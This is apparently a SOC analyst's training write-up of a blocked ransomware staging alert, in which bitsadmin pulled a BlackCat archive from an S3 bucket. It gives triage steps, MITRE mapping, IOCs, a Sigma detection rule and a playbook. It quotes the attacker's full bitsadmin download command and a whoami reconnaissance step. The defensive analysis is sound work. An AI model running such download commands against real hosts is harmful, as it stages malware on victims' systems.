

# SOC192 - Suspicious BITS Usage Detected

## 🚨 Raw Alert Details
```text
EventID : 142
Event Time : 2023-04-27T09:19:05+03:00
Rule : SOC192 - Suspicious BITS Usage Detected
Role : Incident Responder
Alert Type : LOLBin
Difficulty : Medium
MITRE ATT&CK : T1197, T1105, T1033
Hostname : Serena
IP Address : 172.16.17.85
EDR Action : Quarantined
Trigger Reason : bitsadmin /transfer MSUpdate https://files-ld.s3.us-east-2.amazonaws.com/blackcat.bin.zip c:\Users\Serena\Downloads\MSUpdate.27.04.23.zip
```

## Alert Overview
- **Severity:** Medium
- **Detection Source:** EDR / Sysmon
- **Asset Affected:** Serena (172.16.17.85)
- **Threat Type:** Living off the Land (LOLBin) / BITS Abuse / Ransomware Staging (BlackCat/ALPHV)
- **Verdict:** True Positive (Blocked / Quarantined)
- **Containment Status:** Monitored / Cleaned by EDR

## 🧠 Attack Context / Technical Background
This incident involves the abuse of the Windows **Background Intelligent Transfer Service (BITS)** via the native administrative utility `bitsadmin.exe`. 

**The Mechanics:** BITS is designed to asynchronously transfer files in the background using idle bandwidth. Threat actors heavily abuse BITS (`bitsadmin` or PowerShell's `Start-BitsTransfer`) to download malicious payloads because BITS jobs survive system reboots, blend in with normal administrative update traffic, and can bypass traditional proxy or firewall rules that only monitor active user-space browser sessions. In this specific case, the URL payload explicitly references `blackcat.bin.zip`, linking the staging activity directly to the **BlackCat (ALPHV)** Ransomware gang's operational tooling.

## Investigation Steps

### 1. Initial Triage & Process Lineage Analysis
The investigation began by reviewing the trigger reason for Event ID 142, which flagged unauthorized `bitsadmin` activity on host `Serena` (172.16.17.85).
- **Command Line:** `bitsadmin /transfer MSUpdate https://files-ld.s3.us-east-2.amazonaws.com/blackcat.bin.zip c:\Users\Serena\Downloads\MSUpdate.27.04.23.zip`
- **Parent Process:** `cmd.exe`
- **Analysis:** The attacker staged a download job named `MSUpdate` to pull an archive directly into the user's Downloads folder from an external AWS S3 bucket.

  <img width="1575" height="559" alt="image" src="https://github.com/user-attachments/assets/c26fb217-1a0f-4c60-86b5-dc9aacd80304" />



### 2. Reconnaissance & Enumeration Verification
Before initiating the BITS download, the endpoint's terminal history revealed the attacker performing immediate pre-execution reconnaissance.
- **Command Executed:** `whoami /groups` (Timestamp: 09:17:28)
- **Analysis:** The attacker verified their security context and group memberships to ensure they held the necessary privileges to install services or execute administrative payloads prior to fetching the `blackcat` archive.

<img width="1217" height="328" alt="image" src="https://github.com/user-attachments/assets/88731633-ab92-40f4-84b7-eb984408a3b9" />


### 3. BITS Job Lifecycle Tracking
Sysmon logs captured the full lifecycle of the malicious BITS transfer job, confirming successful data movement across the wire.
- **Job Creation (Event ID 1):** `bitsadmin /create MSUpdate`
- **Service Registration (Event ID 3):** The BITS service registered a new job with Job ID `{aca5e752-324c-4c32-8721-aba514dc263d}`.
- **Completion (Event ID 4):** The transfer job completed successfully, placing `MSUpdate.27.04.23.zip` onto the local disk.

<img width="546" height="255" alt="image" src="https://github.com/user-attachments/assets/b3a32a9d-48c0-4519-a40e-59eaf3a3cb08" />

<img width="552" height="237" alt="image" src="https://github.com/user-attachments/assets/e9f33229-f763-41d2-8b01-29c0d4e88b2f" />

<img width="554" height="204" alt="image" src="https://github.com/user-attachments/assets/db9fcaa1-1f52-45ad-bc73-66eea7a14451" />

<img width="552" height="263" alt="image" src="https://github.com/user-attachments/assets/53ac66a2-6d76-455c-b6d0-0ea51b351983" />



### 4. EDR Action & Remediation Verification
- **EDR Verdict:** Unlike previous alerts where payloads executed successfully, the EDR Action for this incident was explicitly marked as **Quarantined**.
- **Analysis:** The endpoint protection agent successfully scanned the extracted contents (containing references to `blackcat.exe` and `akira_readme.txt` variants) and quarantined the malicious files before execution could take place.

<img width="1831" height="533" alt="image" src="https://github.com/user-attachments/assets/c4ac5a05-0e9b-487c-a078-4e3e6ca83422" />


## Analysis & Findings
The incident is a confirmed **True Positive**. An unauthorized entity successfully utilized the native Windows BITS utility (`bitsadmin.exe`) to stage a malicious payload (`blackcat.bin.zip`) from an attacker-controlled AWS S3 bucket. The inclusion of system reconnaissance (`whoami /groups`) confirms human or automated attacker interaction. However, because the EDR Action successfully **Quarantined** the threat upon drop, the ransomware payload was never executed, and the host remained uncompromised.

## MITRE ATT&CK Mapping
| Tactic | Technique ID | Technique Name |
| :--- | :--- | :--- |
| **Execution** | T1059.003 | Command and Scripting Interpreter: Windows Command Shell |
| **Defense Evasion** | T1197 | BITS Jobs (Background Intelligent Transfer Service) |
| **Command and Control** | T1105 | Ingress Tool Transfer |
| **Discovery** | T1033 | System Owner/User Discovery (`whoami`) |

## Indicators of Compromise (IOCs)
| Type | Value | Context |
| :--- | :--- | :--- |
| URL | `https://files-ld.s3.us-east-2.amazonaws.com/blackcat.bin.zip` | BlackCat Staging Payload URL (AWS S3) |
| File Name | `MSUpdate.27.04.23.zip` | Downloaded Archive Name |
| Job Name | `MSUpdate` | BITS Transfer Job Identifier |

## 🛠️ Detection Engineering & Hunting Logic
To improve automated detection of BITS abuse, the following Sigma rule has been engineered for deployment in the SIEM:

```yaml
title: Suspicious BITSAdmin Job Creation for Payload Staging
id: a82f0591-5678-4a5e-994d-70580c3e7e89
status: experimental
description: Detects bitsadmin.exe creating transfer jobs pointing to external S3 buckets or unknown domains.
author: SOC Analyst Portfolio
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4688
    Image: '*\bitsadmin.exe'
    CommandLine|contains:
      - '/transfer'
      - '/create'
      - 'amazonaws.com'
  condition: selection
falsepositives:
  - Legitimate software updates using BITS
level: medium
tags:
  - attack.t1197
  - attack.t1105
```

## 🚀 Decision Tree 
1. **Analyze Trigger Reason:** Did an alert fire for `bitsadmin.exe` or `Start-BitsTransfer`?
   - If Yes -> Examine the command line for destination URLs.
2. **Evaluate Destination:** Is the URL pointing to a public cloud storage bucket (AWS S3) or unknown infrastructure?
   - If Yes -> High probability of payload staging.
3. **Check EDR Action:** Did the endpoint protection engine block or quarantine the resulting file?
   - If Quarantined -> **Verdict: True Positive - Unsuccessful (Attack Blocked).**
4. **Action:** Verify file quarantine status, review terminal history for preceding reconnaissance, and close alert.

## 📝 Playbook Questions & Answers
- **Is the alert a True Positive or False Positive?**
  - *Answer:* True Positive.
  - *Reasoning:* Sysmon and EDR logs confirmed the explicit creation of a BITS transfer job (`MSUpdate`) pulling a malicious BlackCat payload from an external AWS S3 bucket.
- **Has the malware been executed?**
  - *Answer:* No.
  - *Reasoning:* The EDR action explicitly marked the threat as "Quarantined" immediately upon download, preventing execution.
- **Does the device need to be isolated?**
  - *Answer:* No.
  - *Reasoning:* Because the EDR successfully intercepted and quarantined the payload before execution, the host was never compromised, rendering host isolation unnecessary.

## Response & Containment Actions Taken
- **Action Taken:** Verified the EDR quarantine status of the downloaded `.zip` and `.exe` payloads. Added the malicious AWS S3 URL to the perimeter web proxy blocklist.
- **Containment Required:** No.
- **Closure Reason:** True Positive. Ransomware staging attempt successfully blocked and quarantined by EDR.

## Recommendations
1. **BITS Service Restriction:** Consider restricting the execution of `bitsadmin.exe` via AppLocker to administrative accounts only, as standard users have no legitimate business need to manage BITS jobs manually via the command line.
2. **Web Proxy Egress Filtering:** Implement strict content-category filtering for public cloud storage providers (`amazonaws.com`), requiring security review for executables or archives downloaded from unapproved S3 buckets.
3. **Threat Hunting:** Query the SIEM enterprise-wide for any other endpoints that executed `bitsadmin /transfer` with the job name `MSUpdate` within the same timeframe.

## ⚖️ Mistakes and Lessons Learned
- **Analyst Reflection (Evaluating Device Action):** When I first saw the alert involving a ransomware family like BlackCat, my immediate instinct was to panic and hit the "Isolate Host" button.
- **The Lesson (Trust the EDR Action):** Always check the EDR/AV status before taking destructive containment actions. In this case, the EDR successfully **Quarantined** the threat the moment it hit the disk. Because the payload never executed, isolating the workstation would have caused unnecessary business disruption. Knowing the difference between a *payload drop* and a *payload execution* is what separates a reactive analyst from a strategic incident responder.

## 🛠️ Skills & Tools Used
- EDR Process & Command Line Triage (`bitsadmin`)
- BITS Job Lifecycle Analysis (Sysmon Event IDs 1, 3, 4)
- Threat Intelligence Correlation (BlackCat / ALPHV IOCs)
- Incident Response Triage (Evaluating Quarantine vs. Containment)
